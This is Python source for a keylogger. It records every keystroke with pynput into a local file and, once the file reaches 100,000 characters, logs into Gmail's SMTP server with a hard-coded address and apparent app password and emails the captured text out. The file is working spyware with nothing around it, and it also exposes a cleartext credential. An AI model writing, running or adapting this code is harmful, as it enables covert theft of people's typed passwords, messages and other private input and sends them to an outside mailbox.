import smtplib

to_email = 'dgfdfd193@gmail.com'
from_email = 'dgfdfd193@gmail.com'
message = 'hello'
num_emails = 1

from pynput import keyboard

def keypressed(key):
    #print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")
    
    try:
        with open("keyfile.txt", 'r') as file:
            file_contents = file.read()
            print(file_contents)
            num_characters = float(len(file_contents))
            if num_characters >= 100000:
                message = file_contents
                with smtplib.SMTP('smtp.gmail.com','587') as smtpserver:
                    smtpserver.ehlo()
                    smtpserver.starttls()
                    smtpserver.login(from_email,'xezw yelm sjtv orej')
                    for i in range(num_emails):
                        smtpserver.sendmail(from_email,to_email,message)
                        
    except FileNotFoundError:
        print("file not found")
    except Exception as e:
        print("error")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    

    input()
